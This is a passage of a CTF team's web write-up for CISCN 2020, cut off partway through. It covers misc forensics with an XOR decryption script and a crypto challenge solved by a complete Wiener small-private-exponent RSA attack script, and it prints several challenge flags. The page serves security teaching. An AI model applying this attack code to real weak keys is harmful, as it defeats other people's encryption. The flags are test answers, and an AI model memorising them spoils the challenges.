<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>CISCN 2020 | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/9.72c27c98.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>CISCN 2020</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2020-ciscn.html#misc" class="sidebar-link">misc</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#签到" class="sidebar-link">签到</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#the-best-ctf-game" class="sidebar-link">thebestctf_game</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#电脑被黑" class="sidebar-link">电脑被黑</a></li></ul></li><li><a href="/writeup/2020-ciscn.html#crypto" class="sidebar-link">crypto</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#bd" class="sidebar-link">bd</a></li></ul></li><li><a href="/writeup/2020-ciscn.html#rev" class="sidebar-link">rev</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#z3" class="sidebar-link">z3</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#hyperthreading" class="sidebar-link">hyperthreading</a></li></ul></li><li><a href="/writeup/2020-ciscn.html#web" class="sidebar-link">web</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#babyunserialize" class="sidebar-link">babyunserialize</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#easyphp" class="sidebar-link">easyphp</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#littlegame" class="sidebar-link">littlegame</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-ciscn.html#rceme" class="sidebar-link">rceme</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="ciscn-2020"><a href="#ciscn-2020" class="header-anchor">#</a> CISCN 2020</h1> <h2 id="misc"><a href="#misc" class="header-anchor">#</a> misc</h2> <h3 id="签到"><a href="#签到" class="header-anchor">#</a> 签到</h3> <p>第一次见只需要等着就能拿到的签到flag。</p> <p><code>flag{同舟共济扬帆起，乘风破浪万里航。}</code></p> <h3 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="header-anchor">#</a> the_best_ctf_game</h3> <p>拿到了个奇怪的文件。。github搜文件头找到了文件架构：<a href="https://github.com/o-o-overflow/dc2020f-parallel-af-public" target="_blank" rel="noopener noreferrer">o-o-overflow/dc2020f-parallel-af-public<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，怎奈代码跑不起来。</p> <p>转头一看，另一位师傅做出来了。做出来的方式非常misc：</p> <p><img src="/assets/img/2020-ciscn-ctf_game.6f432e48.png" alt=""></p> <p>flag就明晃晃地写在文件里。</p> <p><code>flag{65e02f26-0d6e-463f-bc63-2df733e47fbe}</code></p> <h3 id="电脑被黑"><a href="#电脑被黑" class="header-anchor">#</a> 电脑被黑</h3> <p>没啥技术难度的磁盘取证，被删的文件可以用<a href="http://extundelete.sourceforge.net/" target="_blank" rel="noopener noreferrer">extundelete<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>恢复，之后就是道没啥技术难度的逆向，解密恢复的flag文件。</p> <p>加密算法是为flag的42个字符分别生成系数进行异或等运算。解密脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
v4t <span class="token operator">=</span> <span class="token number">34</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v4t<span class="token punctuation">)</span>
    v4t <span class="token operator">+=</span> <span class="token number">34</span>
    v4t <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xff</span>

v5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
v5t <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v5<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v5t<span class="token punctuation">)</span>
    v5t <span class="token operator">=</span> <span class="token punctuation">(</span>v5t <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">-</span> v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p><code>flag{e5d7c4ed-b8f6-4417-8317-b809fc26c047}</code></p> <h2 id="crypto"><a href="#crypto" class="header-anchor">#</a> crypto</h2> <h3 id="bd"><a href="#bd" class="header-anchor">#</a> bd</h3> <p>看到<code>e</code>很大，怀疑<code>d</code>较小，尝试使用低解密指数攻击。脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">def</span> <span class="token function">rational_to_contfrac</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Converts a rational x/y fraction into
    a list of partial quotients [a0, ..., an]
    '''</span>
    a <span class="token operator">=</span> x<span class="token operator">//</span>y
    <span class="token keyword">if</span> a <span class="token operator">*</span> y <span class="token operator">==</span> x<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>a<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        pquotients <span class="token operator">=</span> rational_to_contfrac<span class="token punctuation">(</span>y<span class="token punctuation">,</span> x <span class="token operator">-</span> a <span class="token operator">*</span> y<span class="token punctuation">)</span>
        pquotients<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        <span class="token keyword">return</span> pquotients


<span class="token keyword">def</span> <span class="token function">convergents_from_contfrac</span><span class="token punctuation">(</span>frac<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    computes the list of convergents
    using the list of partial quotients
    '''</span>
    convs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>frac<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        convs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>contfrac_to_rational<span class="token punctuation">(</span>frac<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> convs


<span class="token keyword">def</span> <span class="token function">contfrac_to_rational</span><span class="token punctuation">(</span>frac<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''Converts a finite continued fraction [a0, ..., an]
    to an x/y rational.
    '''</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>frac<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>frac<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>frac<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        remainder <span class="token operator">=</span> frac<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>frac<span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">(</span>num<span class="token punctuation">,</span> denom<span class="token punctuation">)</span> <span class="token operator">=</span> contfrac_to_rational<span class="token punctuation">(</span>remainder<span class="token punctuation">)</span>
        <span class="token comment"># fraction is now frac[0] + 1/(num/denom), which is</span>
        <span class="token comment"># frac[0] + denom/num.</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>frac<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> num <span class="token operator">+</span> denom<span class="token punctuation">,</span> num<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Extended Euclidean Algorithm
    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)
    '''</span>
    u<span class="token punctuation">,</span> u1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>
    v<span class="token punctuation">,</span> v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>
    <span class="token keyword">while</span> b<span class="token punctuation">:</span>
        q <span class="token operator">=</span> a <span class="token operator">//</span> b
        u<span class="token punctuation">,</span> u1 <span class="token operator">=</span> u1<span class="token punctuation">,</span> u <span class="token operator">-</span> q <span class="token operator">*</span> u1
        v<span class="token punctuation">,</span> v1 <span class="token operator">=</span> v1<span class="token punctuation">,</span> v <span class="token operator">-</span> q <span class="token operator">*</span> v1
        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a <span class="token operator">-</span> q <span class="token operator">*</span> b
    <span class="token keyword">return</span> u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> a


<span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    2.8 times faster than egcd(a,b)[2]
    '''</span>
    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b <span class="token keyword">else</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
    <span class="token keyword">while</span> b<span class="token punctuation">:</span>
        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a <span class="token operator">%</span> b
    <span class="token keyword">return</span> a


<span class="token keyword">def</span> <span class="token function">modInverse</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    d such that de = 1 (mod n)
    e must be coprime to n
    this is assumed to be true
    '''</span>
    <span class="token keyword">return</span> egcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%</span> n


<span class="token keyword">def</span> <span class="token function">totient</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Calculates the totient of pq
    '''</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">bitlength</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Calculates the bitlength of x
    '''</span>
    <span class="token keyword">assert</span> x <span class="token operator">&gt;=</span> <span class="token number">0</span>
    n <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> x <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span>
        x <span class="token operator">=</span> x <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
    <span class="token keyword">return</span> n


<span class="token keyword">def</span> <span class="token function">isqrt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Calculates the integer square root
    for arbitrary large nonnegative integers
    '''</span>
    <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'square root not defined for negative numbers'</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token builtin">divmod</span><span class="token punctuation">(</span>bitlength<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    x <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n<span class="token operator">//</span>x<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span> y <span class="token operator">&gt;=</span> x<span class="token punctuation">:</span>
            <span class="token keyword">return</span> x
        x <span class="token operator">=</span> y


<span class="token keyword">def</span> <span class="token function">is_perfect_square</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    If n is a perfect square it returns sqrt(n),

    otherwise returns -1
    '''</span>
    h <span class="token operator">=</span> n <span class="token operator">&amp;</span> <span class="token number">0xF</span>  <span class="token comment"># last hexadecimal &quot;digit&quot;</span>

    <span class="token keyword">if</span> h <span class="token operator">&gt;</span> <span class="token number">9</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>  <span class="token comment"># return immediately in 6 cases out of 16.</span>

    <span class="token comment"># Take advantage of Boolean short-circuit evaluation</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">!=</span> <span class="token number">2</span> <span class="token keyword">and</span> h <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">and</span> h <span class="token operator">!=</span> <span class="token number">5</span> <span class="token keyword">and</span> h <span class="token operator">!=</span> <span class="token number">6</span> <span class="token keyword">and</span> h <span class="token operator">!=</span> <span class="token number">7</span> <span class="token keyword">and</span> h <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># take square root if you must</span>
        t <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
        <span class="token keyword">if</span> t<span class="token operator">*</span>t <span class="token operator">==</span> n<span class="token punctuation">:</span>
            <span class="token keyword">return</span> t
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>

    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>


<span class="token keyword">def</span> <span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>

    frac <span class="token operator">=</span> rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    convergents <span class="token operator">=</span> convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span>
        <span class="token comment"># check if d is actually the key</span>
        <span class="token keyword">if</span> k <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            phi <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>k
            s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token comment"># check if the equation x^2 - s*x + n = 0</span>
            <span class="token comment"># has integer roots</span>
            discr <span class="token operator">=</span> s<span class="token operator">*</span>s <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span>n
            <span class="token keyword">if</span><span class="token punctuation">(</span>discr <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                t <span class="token operator">=</span> is_perfect_square<span class="token punctuation">(</span>discr<span class="token punctuation">)</span>
                <span class="token keyword">if</span> t <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token operator">+</span>t<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\nHacked!&quot;</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span> d


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    n <span class="token operator">=</span> <span class="token number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span>
    e <span class="token operator">=</span> <span class="token number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span>
    d <span class="token operator">=</span> hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;d=&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span 